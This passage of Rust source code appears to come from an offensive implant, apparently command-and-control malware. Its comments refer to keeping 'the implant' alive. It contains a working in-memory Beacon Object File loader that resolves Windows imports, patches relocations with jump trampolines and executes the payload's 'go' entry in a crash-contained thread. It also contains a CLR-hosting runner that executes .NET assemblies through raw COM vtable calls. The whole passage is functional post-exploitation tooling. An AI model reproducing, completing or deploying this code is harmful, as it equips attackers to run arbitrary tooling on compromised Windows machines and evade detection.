            if sym.name[0..4] == [0, 0, 0, 0] {
                // Name is in the string table. The offset is untrusted: the old
                // code sliced `coff_bytes[start..]` unchecked (panic -> abort with
                // panic="abort", killing the implant). Bounds-check the start and
                // scan for the NUL terminator WITHIN the buffer.
                let str_offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]) as usize;
                let start = string_table_offset.checked_add(str_offset)?;
                if start > coff_bytes.len() { return None; }
                let tail = &coff_bytes[start..];
                let end = tail.iter().position(|&b| b == 0).unwrap_or(tail.len());
                Some(String::from_utf8_lossy(&tail[..end]).to_string())
            } else {
                let end = sym.name.iter().position(|&b| b == 0).unwrap_or(8);
                Some(String::from_utf8_lossy(&sym.name[..end]).to_string())
            }
        };

        // Build symbol address map (symbol-table reads are in bounds - validated above)
        let mut symbol_addrs: Vec<u64> = Vec::with_capacity(num_symbols);
        let mut go_addr: Option<*const u8> = None;
        let mut i = 0;
        while i < num_symbols {
            let sym = *(coff_bytes.as_ptr().add(sym_table_offset + i * 18) as *const CoffSymbol);
            let name = match get_symbol_name(&sym) {
                Some(n) => n,
                None => {
                    VirtualFree(base, 0, MEM_RELEASE);
                    return Err("COFF string table out of bounds".into());
                }
            };

            let addr = if sym.section_number > 0 {
                let sec_idx = (sym.section_number - 1) as usize;
                if sec_idx < section_data.len() {
                    section_data[sec_idx].0 as u64 + sym.value as u64
                } else { 0 }
            } else if sym.section_number == 0 && sym.storage_class == 2 {
                // External symbol: resolve via GetProcAddress
                // BOF convention: __imp_LIBRARY$FunctionName
                let resolved = resolve_bof_import(&name);
                resolved.unwrap_or(0)
            } else { 0 };

            if name == "go" || name == "_go" {
                go_addr = Some(addr as *const u8);
            }

            symbol_addrs.push(addr);
            i += 1 + sym.number_of_aux_symbols as usize;
            // Pad symbol_addrs for aux symbols
            for _ in 0..sym.number_of_aux_symbols {
                symbol_addrs.push(0);
            }
        }

        // Process relocations (section and relocation table reads are in
        // bounds - validated up front)
        for i in 0..num_sections {
            let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
            let num_relocs = sec.number_of_relocations as usize;
            if num_relocs == 0 { continue; }

            let reloc_base = sec.pointer_to_relocations as usize;
            let sec_base = section_data[i].0;
            let sec_footprint = section_data[i].1;

            for r in 0..num_relocs {
                let reloc = *(coff_bytes.as_ptr().add(reloc_base + r * mem::size_of::<CoffReloc>()) as *const CoffReloc);
                let sym_idx = reloc.symbol_table_index as usize;
                if sym_idx >= symbol_addrs.len() { continue; }
                let sym_addr = symbol_addrs[sym_idx];

                // The patch site comes from a raw u32 in untrusted input - the
                // old code wrote through it with no bounds check (OOB write).
                // Validate it against THIS section's allocated footprint first.
                let patch_rva = reloc.virtual_address as usize;
                let patch_size = match reloc.reloc_type {
                    IMAGE_REL_AMD64_ADDR64 => 8usize,
                    IMAGE_REL_AMD64_ADDR32NB | IMAGE_REL_AMD64_REL32 => 4usize,
                    _ => continue, // Skip unsupported relocation types
                };
                if patch_rva.checked_add(patch_size).map_or(true, |end| end > sec_footprint) {
                    VirtualFree(base, 0, MEM_RELEASE);
                    // NB: use the local `patch_rva` copy - referencing the packed
                    // field `reloc.virtual_address` directly (as format! does)
                    // is E0793 undefined behavior.
                    return Err(format!(
                        "BOF relocation site out of bounds: section {} rva 0x{:X}",
                        i + 1, patch_rva
                    ));
                }
                let patch_site = sec_base.add(patch_rva);

                match reloc.reloc_type {
                    IMAGE_REL_AMD64_ADDR64 => {
                        *(patch_site as *mut u64) = sym_addr;
                    }
                    IMAGE_REL_AMD64_ADDR32NB => {
                        let rva = (sym_addr as i64 - base as i64) as i32;
                        *(patch_site as *mut i32) = rva;
                    }
                    IMAGE_REL_AMD64_REL32 => {
                        let distance = sym_addr as i64 - (patch_site as i64 + 4);
                        if distance >= i32::MIN as i64 && distance <= i32::MAX as i64 {
                            // Distance fits in i32 - direct relative patch
                            *(patch_site as *mut i32) = distance as i32;
                        } else {
                            // Distance exceeds ±2GB - emit a trampoline stub:
                            //   mov rax, <abs_addr>   ; 48 B8 <8 bytes>
                            //   jmp rax ; FF E0
                            // Then patch the REL32 to point to the trampoline.
                            if trampoline_offset + TRAMPOLINE_SIZE <= alloc_size {
                                let tramp = (base as *mut u8).add(trampoline_offset);
                                *tramp = 0x48;
                                *tramp.add(1) = 0xB8;
                                *(tramp.add(2) as *mut u64) = sym_addr;
                                *tramp.add(10) = 0xFF;
                                *tramp.add(11) = 0xE0;

                                let tramp_dist = tramp as i64 - (patch_site as i64 + 4);
                                *(patch_site as *mut i32) = tramp_dist as i32;
                                trampoline_offset += TRAMPOLINE_SIZE;
                            } else {
                                VirtualFree(base, 0, MEM_RELEASE);
                                return Err(format!(
                                    "BOF relocation failed: trampoline table exhausted ({} used). \
                                     Target 0x{:X} is >2GB from BOF at 0x{:X}.",
                                    MAX_TRAMPOLINES, sym_addr, base as u64
                                ));
                            }
                        }
                    }
                    _ => {} // unreachable - unsupported types skipped above
                }
            }
        }

        FlushInstructionCache(GetCurrentProcess(), base, alloc_size);

        // Execute `go`
        let go = match go_addr {
            Some(addr) if !addr.is_null() => addr,
            _ => {
                VirtualFree(base, 0, MEM_RELEASE);
                return Err("Symbol 'go' not found in BOF".into());
            }
        };

        // Run in a dedicated OS thread with a Vectored Exception Handler (VEH)
        // to contain hardware exceptions (access violations, segfaults).
        //
        // TRADEOFF: If the BOF crashes, ExitThread bypasses Rust destructors.
        // This can leave the global allocator's internal lock permanently held,
        // which would deadlock future allocations. We mitigate this by:
        //   1. Releasing all our own locks BEFORE calling go()
        //   2. Using unwrap_or_else(|e| e.into_inner()) on our Mutexes to
        //      recover from poisoning
        // The global allocator risk is inherent to any native code execution.
        // True isolation would require a separate process (too expensive for BOFs).
        let args_ptr = args_data.as_ptr() as usize;
        let args_len = args_data.len() as i32;
        let go_addr = go as usize;

        let handle = std::thread::spawn(move || -> Result<(), String> {
            unsafe {
                let tid = GetCurrentThreadId();
                // Register this thread - lock is released immediately after insert
                {
                    bof_thread_ids().lock().unwrap_or_else(|e| e.into_inner()).insert(tid);
                }
                // VEH is registered AFTER the lock is released - no locks held from here
                let veh = AddVectoredExceptionHandler(1, bof_veh_handler);

                // Two layers of crash containment:
                //   1. VEH (above): catches HARDWARE exceptions (segfaults, illegal
                //      instructions, etc.) by calling ExitThread on this thread.
                //      catch_unwind does NOT catch these - only VEH does.
                //   2. catch_unwind: catches RUST panics (if the BOF triggers one
                //      through FFI boundary, or if Rust code panics before/after go()).
                let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                    type GoFn = unsafe extern "C" fn(*const u8, i32);
                    let go_fn: GoFn = mem::transmute(go_addr);
                    go_fn(args_ptr as *const u8, args_len);
                }));

                // Normal return - unregister this thread and remove handler
                bof_thread_ids().lock().unwrap_or_else(|e| e.into_inner()).remove(&tid);
                RemoveVectoredExceptionHandler(veh);

                match result {
                    Ok(_) => Ok(()),
                    Err(_) => Err("BOF panicked during execution".to_string()),
                }
            }
        });

        // thread::join returns Err if the thread panicked OR was killed (VEH ExitThread)
        let bof_result = match handle.join() {
            Ok(Ok(_)) => Ok("BOF executed successfully".into()),
            Ok(Err(e)) => Err(e),
            Err(_) => Err("BOF crashed (hardware exception caught by VEH, thread terminated)".into()),
        };

        // CRITICAL: Do NOT VirtualFree immediately. BOFs commonly spawn async
        // background threads (CreateThread) that continue executing code from
        // the mapped COFF after go() returns. Freeing the memory here would
        // unmap their code mid-execution -> access violation.
        //
        // Deferred cleanup: wait on a background thread for a grace period,
        // then free. Long-running BOF extensions that outlive the grace period
        // should use the Rhai extension system instead.
        let base_addr = base as usize; // usize is Send; raw pointers are not
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(30));
            VirtualFree(base_addr as *mut c_void, 0, MEM_RELEASE);
        });

        bof_result
    }

    /// Resolve BOF import convention: `__imp_KERNEL32$CreateFileA`
    fn resolve_bof_import(name: &str) -> Option<u64> {
        let stripped = name.strip_prefix("__imp_")?;
        let (lib, func) = stripped.split_once('$')?;
        let lib_cstr = std::ffi::CString::new(format!("{}.dll", lib)).ok()?;
        let func_cstr = std::ffi::CString::new(func).ok()?;
        unsafe {
            let h = LoadLibraryA(lib_cstr.as_ptr());
            if h.is_null() { return None; }
            let p = GetProcAddress(h, func_cstr.as_ptr());
            if p.is_null() { None } else { Some(p as u64) }
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub mod bof {
    pub unsafe fn run_bof(_coff_bytes: &[u8], _args_data: &[u8]) -> Result<String, String> {
        Err("BOF execution is Windows-only".into())
    }
}

// ────────────────────────────────────────────────────────────────────────
// 3. .NET ASSEMBLY RUNNER (Windows CLR hosting)
// ────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod dotnet {
    use std::ffi::c_void;
    use std::ptr;

    // CLR COM interface GUIDs and vtable offsets.
    // We use ICLRMetaHost -> ICLRRuntimeInfo -> ICLRRuntimeHost to execute
    // a managed assembly via ExecuteInDefaultAppDomain.

    #[repr(C)]
    struct GUID { data1: u32, data2: u16, data3: u16, data4: [u8; 8] }

    const CLSID_CLR_META_HOST: GUID = GUID {
        data1: 0x9280188d, data2: 0x0e8e, data3: 0x4867,
        data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
    };
    const IID_ICLR_META_HOST: GUID = GUID {
        data1: 0xD332DB9E, data2: 0xB9B3, data3: 0x4125,
        data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
    };
    const IID_ICLR_RUNTIME_INFO: GUID = GUID {
        data1: 0xBD39D1D2, data2: 0xBA2F, data3: 0x486a,
        data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
    };
    const CLSID_CLR_RUNTIME_HOST: GUID = GUID {
        data1: 0x90F1A06E, data2: 0x7712, data3: 0x4762,
        data4: [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
    };
    const IID_ICLR_RUNTIME_HOST: GUID = GUID {
        data1: 0x90F1A06C, data2: 0x7712, data3: 0x4762,
        data4: [0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02],
    };

    type HRESULT = i32;

    extern "system" {
        fn CLRCreateInstance(clsid: *const GUID, iid: *const GUID, ppv: *mut *mut c_void) -> HRESULT;
    }

    /// Execute a .NET assembly via CLR hosting (ExecuteInDefaultAppDomain).
    ///
    /// **NOTE**: Despite being in the `inmem` module, this API requires the
    /// assembly to exist as a file on disk. ExecuteInDefaultAppDomain is a
    /// COM API that takes a file path, NOT a byte array. For true in-memory
    /// .NET execution, use `Assembly.Load(byte[])` via raw COM vtable calls
    /// to the AppDomain interface (not implemented here).
    ///
    /// The assembly must have a class with a static method matching:
    ///   `static int MethodName(string args)`
    ///
    /// Parameters:
    ///   - `assembly_path`: path to the .NET DLL **on disk**
    ///   - `type_name`: fully qualified type (e.g. "MyNamespace.MyClass")
    ///   - `method_name`: method to call (e.g. "Execute")
    ///   - `argument`: string argument passed to the method
    ///   - `runtime_version`: CLR version (e.g. "v4.0.30319")
    pub unsafe fn run_assembly(
        assembly_path: &str,
        type_name: &str,
        method_name: &str,
        argument: &str,
        runtime_version: &str,
    ) -> Result<String, String> {
        // 1. Create ICLRMetaHost
        let mut meta_host: *mut c_void = ptr::null_mut();
        let hr = CLRCreateInstance(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr < 0 { return Err(format!("CLRCreateInstance failed: 0x{:08X}", hr)); }

        // Convert strings to wide (UTF-16)
        let runtime_ver_wide: Vec<u16> = runtime_version.encode_utf16().chain(std::iter::once(0)).collect();
        let assembly_wide: Vec<u16> = assembly_path.encode_utf16().chain(std::iter::once(0)).collect();
        let type_wide: Vec<u16> = type_name.encode_utf16().chain(std::iter::once(0)).collect();
        let method_wide: Vec<u16> = method_name.encode_utf16().chain(std::iter::once(0)).collect();
        let arg_wide: Vec<u16> = argument.encode_utf16().chain(std::iter::once(0)).collect();

        // 2. Get ICLRRuntimeInfo via ICLRMetaHost::GetRuntime
        //    vtable index 3 (after QueryInterface, AddRef, Release)
        let meta_vtable = *(meta_host as *const *const *const c_void);
        let get_runtime: unsafe extern "system" fn(
            *mut c_void, *const u16, *const GUID, *mut *mut c_void
        ) -> HRESULT = std::mem::transmute(*meta_vtable.add(3));

        let mut runtime_info: *mut c_void = ptr::null_mut();
        let hr = get_runtime(meta_host, runtime_ver_wide.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info);
        if hr < 0 { return Err(format!("GetRuntime failed: 0x{:08X}", hr)); }

        // 3. Get ICLRRuntimeHost via ICLRRuntimeInfo::GetInterface
        //    vtable index 9
        let ri_vtable = *(runtime_info as *const *const *const c_void);
        let get_interface: unsafe extern "system" fn(
            *mut c_void, *const GUID, *const GUID, *mut *mut c_void
        ) -> HRESULT = std::mem::transmute(*ri_vtable.add(9));

        let mut runtime_host: *mut c_void = ptr::null_mut();
        let hr = get_interface(runtime_info, &CLSID_CLR_RUNTIME_HOST, &IID_ICLR_RUNTIME_HOST, &mut runtime_host);
        if hr < 0 { return Err(format!("GetInterface failed: 0x{:08X}", hr)); }

        // 4. Start the CLR
        let rh_vtable = *(runtime_host as *const *const *const c_void);
        let start: unsafe extern "system" fn(*mut c_void) -> HRESULT = std::mem::transmute(*rh_vtable.add(3));
        let hr = start(runtime_host);
        if hr < 0 && hr != 1 { // 1 = already started
            return Err(format!("CLR Start failed: 0x{:08X}", hr));
        }

        // 5. ExecuteInDefaultAppDomain (vtable index 11)
        let execute: unsafe extern "system" fn(
            *mut c_void, *const u16, *const u16, *const u16, *const u16, *mut u32
        ) -> HRESULT = std::mem::transmute(*rh_vtable.add(11));

        let mut return_value: u32 = 0;
        let hr = execute(
            runtime_host,
            assembly_wide.as_ptr(),
            type_wide.as_ptr(),
            method_wide.as_ptr(),
            arg_wide.as_ptr(),
            &mut return_value,
        );

        if hr < 0 {
            Err(format!("ExecuteInDefaultAppDomain failed: 0x{:08X}", hr))
        } else {
            Ok(format!(".NET assembly executed, return value: {}", return_value))
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub mod dotnet {
    pub unsafe fn run_assembly(
        _assembly_path: &str, _type_name: &str, _method_name: &str,
        _argument: &str, _runtime_version: &str,
    ) -> Result<String, String> {
        Err(".NET hosting is Windows-only".into())
    }
}
